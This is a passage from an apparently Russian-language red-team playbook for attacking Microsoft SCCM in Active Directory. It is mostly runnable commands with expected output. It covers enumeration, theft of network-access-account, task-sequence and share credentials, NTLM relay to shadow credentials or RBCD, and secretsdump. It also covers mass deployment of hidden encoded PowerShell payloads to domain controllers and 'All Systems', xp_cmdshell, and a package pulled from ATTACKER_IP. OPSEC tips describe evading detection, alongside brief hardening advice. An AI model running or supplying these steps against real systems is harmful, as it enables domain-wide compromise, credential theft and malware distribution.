    -D "${USER}@${DOMAIN}" \
    -w "${PASS}" \
    -b "DC=TARGET,DC=DOMAIN" \
    "(&(objectClass=computer)(servicePrincipalName=SMS*))" \
    sAMAccountName servicePrincipalName memberOf \
    2>/dev/null

# Через impacket ldapdomaindump
python3 /opt/impacket/examples/ldapdomaindump.py \
    -u "TARGET\\${USER}" \
    -p "${PASS}" \
    -d TARGET.DOMAIN \
    --no-pass-check \
    ${DC}
Ожидаемый результат:

text

dn: CN=SMS-MP-S01-SCCMSERVER,CN=System Management,CN=System,DC=TARGET,DC=DOMAIN
mSSMSSiteCode: S01
mSSMSMPName: SCCMSERVER.TARGET.DOMAIN
mSSMSDefaultMP: True

dn: CN=SCCMSERVER,OU=Servers,DC=TARGET,DC=DOMAIN
servicePrincipalName: SMS/SCCMSERVER.TARGET.DOMAIN
Шаг 2.2: SCCMHunter — автоматическая полная разведка иерархии
Что делаем: Запускаем SCCMHunter для автоматического обнаружения всех компонентов SCCM иерархии — CAS, Primary Site, Secondary Site, MP, DP, SUP роли.

Команда:

Bash

git clone https://github.com/garrettfoster13/sccmhunter
cd sccmhunter
pip3 install -r requirements.txt

# Полная автоматическая разведка
python3 sccmhunter.py find \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    -dc-ip 10.10.10.1

# Детальная разведка конкретного сайта
python3 sccmhunter.py smb \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    -dc-ip 10.10.10.1

# Разведка через HTTP (AdminService)
python3 sccmhunter.py http \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    -dc-ip 10.10.10.1 \
    -auto

# Показать результаты предыдущих сканов
python3 sccmhunter.py show -all

# Специфичный вывод по ролям
python3 sccmhunter.py show -mp      # Management Points
python3 sccmhunter.py show -dp      # Distribution Points  
python3 sccmhunter.py show -siteserver  # Site Servers
Ожидаемый результат:

text

[*] Starting SCCM hunter...
[+] Found Site Server: SCCMSERVER.TARGET.DOMAIN (Primary Site: S01)
[+] Found Management Point: MP01.TARGET.DOMAIN
[+] Found Distribution Point: DP01.TARGET.DOMAIN, DP02.TARGET.DOMAIN
[+] Found Software Update Point: SUP01.TARGET.DOMAIN
[+] Hierarchy: SCCMSERVER (Primary) → no CAS detected
[+] SQL Server: SQLSERVER.TARGET.DOMAIN (instance: MSSQLSERVER)
[+] AdminService available: https://SCCMSERVER.TARGET.DOMAIN/AdminService
Шаг 2.3: SharpSCCM — разведка с Windows машины
Что делаем: Запускаем SharpSCCM локально на Windows машине (compromised host или attacker Windows VM) для детальной разведки.

Команда:

PowerShell

# Скачать и скомпилировать, или использовать precompiled binary
# https://github.com/Mayyhem/SharpSCCM/releases

# Получить информацию о локальном SCCM клиенте
.\SharpSCCM.exe local client-info

# Обнаружить MP из AD
.\SharpSCCM.exe get management-points -d TARGET.DOMAIN

# Enum всех клиентов и устройств
.\SharpSCCM.exe get devices -mp sccm.target.domain -sc S01

# Список коллекций
.\SharpSCCM.exe get collections -mp sccm.target.domain -sc S01

# Список приложений и пакетов
.\SharpSCCM.exe get applications -mp sccm.target.domain -sc S01

# Поиск устройства DC
.\SharpSCCM.exe get devices -mp sccm.target.domain -sc S01 `
    -w "Name LIKE 'DC%'"

# Получить NAA credentials (если HTTP MP)
.\SharpSCCM.exe get naa -mp sccm.target.domain -sc S01

# Получить secret policies
.\SharpSCCM.exe get secretpolicies -mp sccm.target.domain -sc S01

# Enum administrators
.\SharpSCCM.exe get class-instances SMS_Admin -mp sccm.target.domain -sc S01
Ожидаемый результат:

text

[+] Management Point: sccm.target.domain
[+] Site Code: S01
[+] Devices (247 total):
    DC01.TARGET.DOMAIN - Windows Server 2022 - LastActive: 2024-01-15
    FILESERVER01 - Windows Server 2019
    WORKSTATION001 - Windows 11

[+] SCCM Administrators:
    TARGET\svc_sccm_admin - Full Administrator
    TARGET\sccm_admins (group) - Full Administrator  
    SCCMSERVER$ - Full Administrator
Шаг 2.4: BloodHound — SCCM edges в AD граф
Что делаем: Запускаем BloodHound сбор данных включая SCCM-специфичные edges (если установлен SCCM-BloodHound плагин).

Команда:

Bash

# === С Linux — bloodhound-python ===
python3 -m bloodhound \
    -d TARGET.DOMAIN \
    -u lowpriv_user \
    -p 'Password123!' \
    -dc 10.10.10.1 \
    -c All \
    --zip

# SCCM-специфичный collector (если доступен)
# https://github.com/BloodHoundAD/SCCM-BloodHound
python3 sccm_bloodhound.py \
    -d TARGET.DOMAIN \
    -u lowpriv_user \
    -p 'Password123!' \
    -mp sccm.target.domain

# === С Windows — SharpHound ===
.\SharpHound.exe -c All --zipfilename bloodhound_output

# Cypher запросы для SCCM в BloodHound
# Найти пути к SCCM admin через ACL
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name:"SCCMSERVER.TARGET.DOMAIN"}))
RETURN p

# Найти все computer accounts с правами на SCCM
MATCH (c:Computer)-[:AdminTo]->(s:Computer {name:"SCCMSERVER.TARGET.DOMAIN"})
RETURN c.name

# SCCM Full Admin → DA path
MATCH p=(u:User)-[:MemberOf*0..]->(g:Group)-[:AdminTo]->(c:Computer)
WHERE c.name CONTAINS 'SCCM'
RETURN p LIMIT 50
Ожидаемый результат:

text

[*] Loaded SharpHound output
[*] Importing 5,432 objects
[!] SCCM edge: SCCMSERVER$ → HasFullAdmin → TARGET.DOMAIN
[!] Path: lowpriv_user → MemberOf → sccm_readers → CanReadSCCM → SCCMSERVER
Шаг 2.5: Чтение SCCM-related AD групп и ACL
Что делаем: Исследуем ACL на SCCM AD объекты и группы членства для понимания привилегий.

Команда:

Bash

# Список SCCM-связанных групп
ldapsearch -x -H ldap://10.10.10.1 \
    -D "lowpriv_user@TARGET.DOMAIN" \
    -w 'Password123!' \
    -b "DC=TARGET,DC=DOMAIN" \
    "(&(objectClass=group)(cn=*sccm*))" \
    cn member managedBy description

# ACL на System Management container
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -target-dn "CN=System Management,CN=System,DC=TARGET,DC=DOMAIN" \
    -dc-ip 10.10.10.1 \
    TARGET.DOMAIN/lowpriv_user:Password123!

# Проверка прав SCCM server machine account
python3 /opt/impacket/examples/dacledit.py \
    -action read \
    -principal "SCCMSERVER$" \
    -dc-ip 10.10.10.1 \
    TARGET.DOMAIN/lowpriv_user:Password123!

# PowerView аналог (Windows)
Get-DomainObjectAcl -SearchBase "CN=System Management,CN=System,DC=TARGET,DC=DOMAIN" `
    -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "FullControl|Write"}
Ожидаемый результат:

text

[+] ACL on CN=System Management:
    SCCMSERVER$ → GenericAll (Full Control)
    TARGET\sccm_install_admins → WriteProperty
    TARGET\Domain Admins → FullControl
Шаг 2.6: Извлечение NAA credentials через зарегистрированный клиент
Что делаем: Регистрируем легитимный SCCM клиент с доменными кредами и извлекаем NAA из зашифрованной политики через DPAPI.

Версионность: SharpSCCM поддерживает CB 2002+. Метод DPAPI работает если клиент уже установлен.

Команда:

PowerShell

# === На Windows машине с установленным SCCM клиентом ===

# Метод 1: SharpSCCM get naa (прямой запрос от клиента)
.\SharpSCCM.exe get naa

# Ожидаем получить зашифрованные NAA в base64 — SharpSCCM автодешифрует

# Метод 2: Извлечение из WMI (SYSTEM required)
# Запускаем как SYSTEM через PsExec или другой privileged path
.\SharpSCCM.exe local secrets -disk
.\SharpSCCM.exe local secrets -wmi

# Метод 3: Ручное DPAPI извлечение
# Находим политику в реестре
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SMS\Mobile Client" /s

# Получаем PolicySecret
$policyPath = "HKLM:\SOFTWARE\Microsoft\CCM\CCMClient"
Get-Item $policyPath

# DPAPI дешифровка через mimikatz
privilege::debug
sekurlsa::dpapi

# Или через SharpDPAPI
.\SharpDPAPI.exe certificates /machine
.\SharpDPAPI.exe machinecredentials

# Метод 4: pypykatz для DPAPI (Linux after получения файлов)
pypykatz dpapi prekey password \
    "SYSTEM_USER_PASSWORD" \
    --sid "S-1-5-21-XXXXX" | \
    tee dpapi_keys.txt

pypykatz dpapi blob \
    --masterkey-file masterkey.bin \
    --dpapi-blob-file sccm_policy_secret.bin
Ожидаемый результат:

text

[*] Requesting NAA policy from Management Point
[*] Decrypting policy with machine certificate
[+] NetworkAccessUsername: TARGET\svc_naa
[+] NetworkAccessPassword: N@ASecretPwd!
Шаг 2.7: Поиск credentials в Task Sequences
Что делаем: Task Sequences могут содержать hardcoded credentials в шагах Run Command Line, Install Application, Set Dynamic Variables.

Команда:

PowerShell

# === SharpSCCM: получить все Task Sequences ===
.\SharpSCCM.exe get class-instances SMS_TaskSequencePackage `
    -mp sccm.target.domain `
    -sc S01 `
    -p "Name,PackageID,PkgSourcePath,LastRefreshTime"

# Получить содержимое Task Sequence (XML с шагами)
.\SharpSCCM.exe get class-instances SMS_TaskSequencePackage `
    -mp sccm.target.domain `
    -sc S01 `
    -w "PackageID='S0100001'"

# === SCCMHunter: автоматический поиск credentials в TS ===
python3 sccmhunter.py dpapi \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    -dc-ip 10.10.10.1

# === Ручной подход: скачать TS XML и grep ===
# Если есть доступ к AdminService
curl -sk \
    -u "TARGET\lowpriv_user:Password123!" \
    "https://sccm.target.domain/AdminService/v1.0/SMS_TaskSequencePackage" \
    | python3 -c "
import json,sys
data=json.load(sys.stdin)
for ts in data.get('value',[]):
    print(f\"TS: {ts.get('Name')} ({ts.get('PackageID')})\")
    seq = ts.get('Sequence','')
    # Ищем паттерны кредентиалов
    import re
    for pattern in ['password','passwd','pwd','credential','cred','secret']:
        matches = re.findall(f'.{{0,50}}{pattern}.{{0,50}}', seq, re.IGNORECASE)
        for m in matches: print(f'  [!] {m}')
"
Ожидаемый результат:

text

[!] Task Sequence: "Win11 OSD v3.2" (S0100003)
    [CREDENTIAL FOUND] Step "Join Domain": DomainAdminUser=TARGET\ts_admin
    [CREDENTIAL FOUND] Step "Set Local Admin": AdminPassword=Local@dmin2024
    [CREDENTIAL FOUND] Step "Install SCCM Agent": UserName=TARGET\svc_sccm
Шаг 2.8: Поиск credentials в Distribution Point пакетах
Что делаем: Проверяем DP shares на наличие пакетов с credentials — скрипты установки, конфиги, INI файлы.

Команда:

Bash

# Перечисляем DP shares
smbclient -U "TARGET\lowpriv_user%Password123!" \
    -L //DP01.TARGET.DOMAIN/ 2>/dev/null | grep -iE "SMS_DP|SCCMContent|share"

# Рекурсивный листинг SMS_DP$
smbclient -U "TARGET\lowpriv_user%Password123!" \
    //DP01.TARGET.DOMAIN/SMS_DP$ -c 'recurse ON; ls' 2>/dev/null | \
    grep -iE "\.ps1$|\.bat$|\.cmd$|\.ini$|\.xml$|\.conf$"

# Скачать все найденные скрипты
smbclient -U "TARGET\lowpriv_user%Password123!" \
    //DP01.TARGET.DOMAIN/SMS_DP$ << 'EOF'
recurse ON
prompt OFF
mget *.ps1 *.bat *.cmd *.ini *.xml
EOF

# Grep по скаченным файлам
grep -ri "password\|passwd\|credential\|secret\|connectionstring\|datasource" \
    /tmp/dp_files/ \
    --include="*.ps1" --include="*.bat" --include="*.xml" --include="*.ini" \
    -l

# Детальный вывод
grep -ri "password\|passwd" /tmp/dp_files/ \
    --include="*.ps1" \
    -h | grep -v "^#" | head -50

# Через NetExec
netexec smb DP01.TARGET.DOMAIN \
    -u lowpriv_user \
    -p 'Password123!' \
    --spider SMS_DP\$ \
    --pattern "password|passwd|credential"
Ожидаемый результат:

text

[!] Found: //DP01/SMS_DP$/S0100005/install.ps1
    Line 12: $SQLPassword = "DB@dmin2024!"
    Line 45: $ServiceAccount = "TARGET\svc_app"
    Line 46: $ServicePassword = "AppSvc123!"
Шаг 2.9: Анализ прав доступа к AdminService
Что делаем: Проверяем что может делать наш текущий пользователь через AdminService REST API.

Команда:

Bash

USER="lowpriv_user"
PASS='Password123!'
MP="https://sccm.target.domain"

# Проверка базового доступа
curl -sk -u "TARGET\\${USER}:${PASS}" \
    "${MP}/AdminService/v1.0/" | python3 -m json.tool

# Список доступных endpoints
curl -sk -u "TARGET\\${USER}:${PASS}" \
    "${MP}/AdminService/v1.0/\$metadata" | \
    grep -oE 'EntitySet Name="[^"]*"'

# Проверка доступа к Device информации
curl -sk -u "TARGET\\${USER}:${PASS}" \
    "${MP}/AdminService/v1.0/Device?\$top=5" | \
    python3 -m json.tool

# SMS_Admin — кто имеет Full Admin права
curl -sk -u "TARGET\\${USER}:${PASS}" \
    "${MP}/AdminService/wmi/SMS_Admin" | \
    python3 -c "
import json,sys
data=json.load(sys.stdin)
for admin in data.get('value',[]):
    print(f\"{admin.get('LogonName')} - RoleNames: {admin.get('RoleNames')}\")
"

# Проверяем наш уровень прав
curl -sk -u "TARGET\\${USER}:${PASS}" \
    "${MP}/AdminService/wmi/SMS_Admin?\$filter=LogonName eq 'TARGET\\\\${USER}'" | \
    python3 -m json.tool
Ожидаемый результат:

JSON

{
  "value": [
    {
      "LogonName": "TARGET\\svc_sccm_admin",
      "RoleNames": ["Full Administrator"],
      "CategoryNames": ["All"]
    },
    {
      "LogonName": "TARGET\\lowpriv_user", 
      "RoleNames": ["Read-only Analyst"],
      "CategoryNames": ["All"]
    }
  ]
}
OPSEC-заметки
text

РИСКИ ФАЗЫ 2:
[!] SharpSCCM queries → видны в SCCM Status Messages и SQL logs
    МИТИГАЦИЯ: использовать разумный интервал между запросами
    
[!] AdminService запросы → IIS access logs на SCCM сервере
    МИТИГАЦИЯ: использовать легитимный User-Agent ("CCM/...")
    
[!] BloodHound сбор → большое количество LDAP запросов за короткое время
    МИТИГАЦИЯ: --throttle 1000 --jitter 500 параметры
    
[!] SMB spider на DP → share access logs
    МИТИГАЦИЯ: точечный доступ к конкретным файлам а не рекурсивный листинг
    
[!] DPAPI операции через mimikatz → детектируются EDR
    МИТИГАЦИЯ: использовать SharpDPAPI, dump offload через Lsassy
Pivot-точки
text

NAA creds получены → тестируем на всей сети (часто privileged)
TS creds получены → часто domain join account (привилегированный)
DP пакеты содержат creds → SQL, service accounts → Фаза 3
AdminService доступен → Фаза 3 Шаг 3.3 (REST API attacks)
SCCM Full Admin найден → Фаза 3 Шаг 3.4 (если мы или ваш путь к нему)
SQL server идентифицирован → Фаза 3 Шаг 3.6 (SQL attacks)
Decision Tree Фазы 2
text

Получили NAA/TS/DP credentials?
├── ДА, низкие привилегии → проверяем на всей сети через netexec
├── ДА, domain admin уровень → Фаза 5 (прямой DA)
└── НЕТ → продолжаем разведку

Текущий user = SCCM Full Admin?
├── ДА → Фаза 3, Шаг 3.4 (прямой деплой)
└── НЕТ → ищем путь к escalation через Фазу 3

AdminService доступен (200)?
├── ДА → Фаза 3, Шаг 3.3 (REST API attacks)
└── НЕТ → 401/403 → нужен SCCM admin role
Защитные меры (для отчёта)
text

DETECTION:
- SCCM Status Messages: мониторинг нестандартных client registrations
- IIS logs: анализ паттернов AdminService запросов
- SQL Server: аудит запросов к SCCM DB
- BloodHound: детект аномального количества LDAP запросов (Event 1644)
- SACL на DP shares: аудит доступа к SMS_DP$

HARDENING:
- Убрать credentials из Task Sequences — использовать MDT secrets или Azure KeyVault
- Включить "Approve computers manually" для client registration
- DP пакеты: шифровать Distribution Point content
- AdminService: требовать certificate-based auth, включить HTTPS only
- NAA account: минимальные права, только read на DP share, не domain account
- Аудит членства в SCCM administrative roles
ФАЗА 3: ЭСКАЛАЦИЯ ЧЕРЕЗ SCCM (Domain User → Local Admin/DA)
Цель фазы
Эскалировать привилегии от доменного пользователя до Domain Admin используя SCCM как вектор атаки.

Предусловия
Валидные доменные credentials
Идентифицированы MP, DP, SQL server из Фазы 2
Attacker box с сетевым доступом к SCCM инфраструктуре
Инструменты
SharpSCCM
SCCMHunter
MalSCCM (https://github.com/nettitude/MalSCCM)
impacket — ntlmrelayx, mssqlclient
PowerSCCM
Rubeus (для Kerberos атак)
mimikatz
netexec/crackmapexec
Последовательность действий
Шаг 3.1: SCCM Client Push Coercion → NTLM Relay → RBCD/Shadow Creds
Что делаем: С доменными кредами принудительно запускаем Client Push на новый (поддельный) компьютер в AD, чья DNS запись указывает на нас. Relay NTLM от SCCMSERVER$ для создания shadow credentials или RBCD.

Конфигурационный флаг: Automatic site assignment and client push installation — включён.

Команда:

Bash

# === ПОДГОТОВКА ===
ATTACKER_IP="10.10.10.200"
DC_IP="10.10.10.1"
DOMAIN="TARGET.DOMAIN"
USER="lowpriv_user"
PASS='Password123!'
SCCM_MP="sccm.target.domain"
SCCM_SITE="S01"

# Шаг 1: Создаём компьютер в AD
python3 /opt/impacket/examples/addcomputer.py \
    -computer-name FAKESYS \
    -computer-pass 'FakePass123!' \
    -dc-ip ${DC_IP} \
    ${DOMAIN}/${USER}:${PASS}

# Шаг 2: Добавляем DNS A запись для FAKESYS → ATTACKER_IP
python3 /opt/impacket/examples/dnstool.py \
    -u "${DOMAIN}\\${USER}" \
    -p "${PASS}" \
    -r FAKESYS.${DOMAIN} \
    -a add \
    -d ${ATTACKER_IP} \
    ${DC_IP}

# Шаг 3: Запускаем ntlmrelayx для перехвата
# Цель: LDAPS для добавления shadow credentials к SCCMSERVER$
python3 /opt/impacket/examples/ntlmrelayx.py \
    -t ldaps://${DC_IP} \
    --shadow-credentials \
    --shadow-target "SCCMSERVER$" \
    --no-smb-server \
    --no-http-server \
    -smb2support \
    --remove-mic &

# ИЛИ целимся на создание RBCD
python3 /opt/impacket/examples/ntlmrelayx.py \
    -t ldap://${DC_IP} \
    --delegate-access \
    --escalate-user FAKESYS\$ \
    --no-smb-server \
    --no-http-server \
    -smb2support &

# Шаг 4: Запускаем SMB listener на нашем IP (порт 445)
# ntlmrelayx уже слушает на всех интерфейсах

# Шаг 5: Триггерим Client Push через SharpSCCM
# SharpSCCM отправляет запрос на MP для немедленного push на FAKESYS
.\SharpSCCM.exe invoke client-push \
    -mp ${SCCM_MP} \
    -sc ${SCCM_SITE} \
    -t FAKESYS.${DOMAIN}

# ИЛИ через SCCMHunter
python3 sccmhunter.py clientpush \
    -u ${USER} \
    -p ${PASS} \
    -d ${DOMAIN} \
    -dc-ip ${DC_IP} \
    -mp ${SCCM_MP} \
    -t FAKESYS.${DOMAIN}

# ИЛИ ручной trigger через AdminService
curl -sk \
    -u "${DOMAIN}\\${USER}:${PASS}" \
    -X POST \
    "https://${SCCM_MP}/AdminService/wmi/SMS_ClientOperation" \
    -H "Content-Type: application/json" \
    -d '{
        "ObjectPath": "\\\\FAKESYS.TARGET.DOMAIN",
        "ActionType": "ClientNotification_RequestPolicy"
    }'
После успешного relay:

Bash

# Shadow credentials получены — используем для аутентификации как SCCMSERVER$
# ntlmrelayx сохранил .pfx файл
python3 /opt/PKINITtools/gettgtpkinit.py \
    -cert-pfx /tmp/SCCMSERVER$.pfx \
    -pfx-pass "" \
    ${DOMAIN}/SCCMSERVER$ \
    /tmp/sccmserver.ccache

# Получаем TGT от имени SCCMSERVER$
export KRB5CCNAME=/tmp/sccmserver.ccache
python3 /opt/PKINITtools/getnthash.py \
    -key $(cat /tmp/sccmserver_key.txt) \
    ${DOMAIN}/SCCMSERVER$

# RBCD путь: используем FAKESYS$ для получения ST к SCCMSERVER$
python3 /opt/impacket/examples/getST.py \
    -spn cifs/SCCMSERVER.TARGET.DOMAIN \
    -impersonate Administrator \
    -dc-ip ${DC_IP} \
    ${DOMAIN}/FAKESYS\$:FakePass123!

export KRB5CCNAME=Administrator.ccache
python3 /opt/impacket/examples/secretsdump.py \
    -k -no-pass \
    SCCMSERVER.TARGET.DOMAIN
Ожидаемый результат:

text

[*] SMBD: Incoming connection from SCCMSERVER.TARGET.DOMAIN (10.10.10.50)
[*] Authenticating against ldaps://10.10.10.1 as TARGET\SCCMSERVER$
[+] Shadow credentials added for SCCMSERVER$
[+] Certificate saved to: /tmp/SCCMSERVER$.pfx
---
[+] SCCMSERVER$:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
Если не работает: Client Push не настроен или триггер не срабатывает → Шаг 3.2 (device registration attack).

Шаг 3.2: Регистрация поддельного Device → Machine Policy → Escalation
Что делаем: Регистрируем поддельное устройство от имени другого компьютера (например DC$) и получаем его машинные политики которые могут содержать привилегированные данные.

Конфигурационный флаг: Allow automatic client approval — включён (стандарт).

Команда:

Bash

# === MalSCCM — специализированный инструмент для этой атаки ===
git clone https://github.com/nettitude/MalSCCM
cd MalSCCM

# Если у нас hash SCCM client machine account (DC$):
# Регистрируемся от имени DC$ и получаем его политики
.\MalSCCM.exe register \
    -mp http://sccm.target.domain \
    -sitecode S01 \
    -computername DC01 \
    -computerfqdn DC01.TARGET.DOMAIN

# Запрашиваем machine policy для DC01
.\MalSCCM.exe requestpolicy \
    -mp http://sccm.target.domain \
    -sitecode S01 \
    -computername DC01

# Извлекаем секреты из полученной политики
.\MalSCCM.exe getpolicysecrets \
    -mp http://sccm.target.domain \
    -sitecode S01

# === SharpSCCM аналогичный путь ===
.\SharpSCCM.exe get secretpolicies \
    -mp sccm.target.domain \
    -sc S01

# === sccmwtf от xpn — наиболее полная реализация ===
python3 sccmwtf.py \
    -mp http://sccm.target.domain \
    -site S01 \
    -target DC01 \
    -username "TARGET\lowpriv_user" \
    -password "Password123!"
Ожидаемый результат:

text

[*] Registering device: DC01.TARGET.DOMAIN
[*] ClientID: GUID:{8F3A2B1C-...}
[*] Requesting machine policy...
[*] Policy received: 47 policies
[*] Extracting credentials from policy...
[+] NetworkAccessAccount: TARGET\svc_naa : NAA_Password!
[+] CertificateThumbprint: A3:B5:... (SCCM client certificate for DC01)
Шаг 3.3: AdminService REST API атаки
Что делаем: Если у нас есть минимальный доступ к AdminService (или Full Admin) — используем REST API для деплоя payload.

Конфигурационный флаг: AdminService включён (стандартно в CB 1810+). Требует HTTPS.

Команда:

Bash

MP="https://sccm.target.domain"
AUTH="TARGET\sccm_admin_user:AdminPassword!"
SITE="S01"

# === Шаг A: Создаём скрипт для деплоя ===
# 1. Создаём Script через AdminService
curl -sk \
    -u "${AUTH}" \
    -X POST \
    "${MP}/AdminService/wmi/SMS_Scripts" \
    -H "Content-Type: application/json" \
    -d "{
        \"ScriptName\": \"Update-DiagTool\",
        \"ScriptText\": \"$(base64 -w0 /tmp/payload.ps1)\",
        \"Language\": \"PowerShell\",
        \"ApprovalState\": 2
    }"

# 2. Получаем ScriptGuid из ответа
SCRIPT_GUID=$(curl -sk -u "${AUTH}" \
    "${MP}/AdminService/wmi/SMS_Scripts?\$filter=ScriptName eq 'Update-DiagTool'" | \
    python3 -c "import json,sys; data=json.load(sys.stdin); print(data['value'][0]['ScriptGuid'])")

# 3. Запускаем скрипт на целевой машине
# Получаем ResourceID целевой машины
RESOURCE_ID=$(curl -sk -u "${AUTH}" \
    "${MP}/AdminService/v1.0/Device?\$filter=Name eq 'DC01'" | \
    python3 -c "import json,sys; data=json.load(sys.stdin); print(data['value'][0]['MachineId'])")

# 4. Запускаем через CMPivot или Script runner
curl -sk \
    -u "${AUTH}" \
    -X POST \
    "${MP}/AdminService/v1.0/RunScript" \
    -H "Content-Type: application/json" \
    -d "{
        \"ScriptGuid\": \"${SCRIPT_GUID}\",
        \"TargetCollectionId\": \"SMS00001\",
        \"CollectionMemberIds\": [${RESOURCE_ID}]
    }"

# === SharpSCCM деплой через AdminService ===
.\SharpSCCM.exe exec -p "cmd.exe /c whoami > C:\Windows\Temp\out.txt" \
    -mp sccm.target.domain \
    -sc S01 \
    -d DC01

# === MalSCCM executive ===
.\MalSCCM.exe exec \
    -mp https://sccm.target.domain \
    -sitecode S01 \
    -cmd "powershell -enc BASE64_PAYLOAD" \
    -device DC01
Ожидаемый результат:

text

[*] Script created with GUID: {A1B2C3D4-...}
[*] Executing on DC01...
[+] Script execution initiated
[+] Result: NT AUTHORITY\SYSTEM
Шаг 3.4: Full Admin через misconfigured роли → массовый деплой
Что делаем: Если текущий пользователь является SCCM Full Admin (или мы получили такие права через relay) — деплоим payload на все managed машины.

Команда:

PowerShell

# === SharpSCCM — деплой через Application ===

# 1. Создаём Application с payload
.\SharpSCCM.exe new application \
    -mp sccm.target.domain \
    -sc S01 \
    -n "Windows Defender Update" \
    -cmd "powershell.exe -nop -w hidden -enc PAYLOAD_BASE64"

# 2. Деплоим на коллекцию "All Systems" (SMS00001)
.\SharpSCCM.exe new deployment \
    -mp sccm.target.domain \
    -sc S01 \
    -collection-id SMS00001 \
    -application "Windows Defender Update" \
    -method install

# === MalSCCM — деплой через Package/Program ===
# 1. Загружаем payload на DP
.\MalSCCM.exe uploadpkg \
    -mp https://sccm.target.domain \
    -sitecode S01 \
    -pkgname "Diagnostic Update" \
    -pkgpath "\\\\ATTACKER_IP\\share\\payload.exe"

# 2. Деплоим
.\MalSCCM.exe deploypkg \
    -mp https://sccm.target.domain \
    -sitecode S01 \
    -pkgname "Diagnostic Update" \
    -collection "SMS00001"

# === CMPivot — мгновенное выполнение на всех клиентах ===
# Через AdminService CMPivot
$body = @{
    InputQuery = "File('C:\\Windows\\Temp\\test.txt').ReadLines()"
    Collection = "SMS00001"
} | ConvertTo-Json

Invoke-RestMethod \
    -Uri "https://sccm.target.domain/AdminService/v1.0/Collections('SMS00001')/AdminService.RunCMPivotQuery" \
    -Credential (Get-Credential) \
    -Method POST \
    -Body $body \
    -ContentType "application/json"

# Реальный RCE через CMPivot
$body = @{
    InputQuery = "Process | where (Name == 'cmd') | invoke RunCommand('whoami /all')"
} | ConvertTo-Json
Шаг 3.5: Lateral Movement — деплой на конкретные высокоценные цели
Что делаем: Точечный деплой на DC, File Server, Certificate Authority с помощью SCCM коллекций.

Команда:

PowerShell

# Находим DC в SCCM inventory
.\SharpSCCM.exe get devices \
    -mp sccm.target.domain \
    -sc S01 \
    -w "OperatingSystemNameAndVersion LIKE 'Windows Server%' AND Name LIKE 'DC%'"

# Создаём Device Collection только с DC
.\SharpSCCM.exe new collection \
    -mp sccm.target.domain \
    -sc S01 \
    -t device \
    -n "Targets" \
    -r "Name LIKE 'DC%'"

# Добавляем конкретное устройство
.\SharpSCCM.exe new collection-member \
    -mp sccm.target.domain \
    -sc S01 \
    -collection-name "Targets" \
    -device "DC01"

# Деплоим на созданную коллекцию
.\SharpSCCM.exe exec \
    -mp sccm.target.domain \
    -sc S01 \
    -collection-name "Targets" \
    -p "powershell.exe -nop -w hidden -enc BASE64_PAYLOAD"

# === Через AdminService ===
# Получить ResourceID DC01
RESOURCE_ID=$(curl -sk \
    -u "TARGET\sccm_admin:password" \
    "https://sccm.target.domain/AdminService/v1.0/Device?\$filter=Name eq 'DC01'" | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print(d['value'][0]['MachineId'])")

# Создать коллекцию и деплой
curl -sk -u "TARGET\sccm_admin:password" -X POST \
    "https://sccm.target.domain/AdminService/wmi/SMS_Collection" \
    -H "Content-Type: application/json" \
    -d "{
        \"Name\": \"TargetDCs\",
        \"CollectionType\": 2,
        \"MembershipRules\": [
            {\"MemberClassName\": \"SMS_CollectionRuleQuery\",
             \"QueryExpression\": \"SELECT * FROM SMS_R_System WHERE Name = 'DC01'\"}
        ]
    }"
Шаг 3.6: MSSQL takeover — SCCM DB прямой доступ
Что делаем: Если SQL Server доступен с текущими кредами (sysadmin, или через сервисный аккаунт SCCM), получаем RCE через xp_cmdshell или извлекаем секреты из SCCM базы.

Версионность: Работает на всех версиях где SQL доступен.

Команда:

Bash

# Обнаруживаем SQL сервер SCCM
# SQL часто на том же сервере что и Primary Site или на отдельном SQLSERVER

# Проверяем доступность SQL с текущими кредами
python3 /opt/impacket/examples/mssqlclient.py \
    -windows-auth \
    "TARGET/lowpriv_user:Password123!@SQLSERVER.TARGET.DOMAIN"

# Если доступ есть — проверяем роль
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('db_owner', 'CM_S01');

# Если sysadmin — включаем xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD';

# Извлечение NAA credentials из SCCM DB (зашифрованы, но...)
USE CM_S01;
SELECT * FROM dbo.SC_UserAccount;
SELECT * FROM dbo.vSMS_SC_UserAccount;

# Расшифровка через SCCM ключ (требует прав на SCCM сервере)
# Ключ хранится в HKLM\SOFTWARE\Microsoft\SMS\Security

# Через NetExec если хотим автоматически
netexec mssql SQLSERVER.TARGET.DOMAIN \
    -u lowpriv_user \
    -p 'Password123!' \
    -d TARGET.DOMAIN \
    --local-auth \
    -M mssql_priv

# Проверяем linked servers (часто настроены между SCCM SQL и другими)
SELECT * FROM sys.servers;
SELECT * FROM sys.linked_logins;

# Атака через linked server (если есть привилегированный link)
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SQL_SERVER];
Шаг 3.7: SCCM Hierarchy Takeover — CAS→Primary→Secondary
Что делаем: Если в инфраструктуре есть иерархия с CAS (Central Administration Site), компрометируем CAS для получения контроля над всеми Primary и Secondary sites.

Версионность: CAS существует в крупных deployments (100+ клиентов в нескольких сайтах). CB 2103+ поддерживает упрощённую иерархию.

Команда:

Bash

# Определяем наличие CAS из SCCMHunter вывода
python3 sccmhunter.py show -siteserver

# CAS обычно имеет SiteType = CAS в SMS_Site
curl -sk -u "TARGET\lowpriv_user:Password123!" \
    "https://sccm.target.domain/AdminService/wmi/SMS_Site" | \
    python3 -c "
import json,sys
data=json.load(sys.stdin)
for site in data.get('value',[]):
    print(f\"{site.get('SiteCode')} - Type: {site.get('Type')} - Server: {site.get('ServerName')}\")
# Type 4 = CAS, Type 2 = Primary, Type 1 = Secondary
"

# Если скомпрометировали Primary — есть ли права на CAS?
